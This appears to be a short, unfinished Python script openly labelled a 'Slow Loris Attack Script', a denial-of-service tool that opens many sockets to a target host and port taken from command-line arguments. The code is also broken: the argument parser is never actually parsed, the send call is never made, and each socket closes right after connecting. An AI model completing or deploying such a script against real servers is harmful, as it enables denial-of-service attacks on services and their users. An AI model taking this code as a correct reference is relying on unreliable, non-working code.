import socket
import sys
import argparse

#arg parse stuff
parser = argparse.ArgumentParser(prog="sloris", description="Slow Loris Attack Script")

parser.add_argument("domain", help="Host")

#default 0 so the os picks the port
parser.add_argument("-p", "--port", type=int, default=0, help="Port")

parser.add_argument("-a", "--alivetime", type=int, default=4, help="Keep Alive Time")

parser.add_argument("-s", "--socket", type=int, default=200, help="# of sockets")

#if its 1 or less then poop pants
if len(parser._get_args()) <= 1:
    parser.print_help()
    sys.exit(1)

#if no domain then poop pants
if not parser.domain:
    print("need to specify a domain")
    parser.print_help()
    sys.exit(1)


#init and send for each socket
def sockInit():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        #set the time out time default 4
        sock.settimeout(parser.alivetime)
        #no bind because you dont want the os to get confused
        sock.connect((parser.domain, parser.port))

        sock.send
    

def main():
    for i in range(parser.socket):
        print("socket #{}".format(i))
        sockInit()

main()

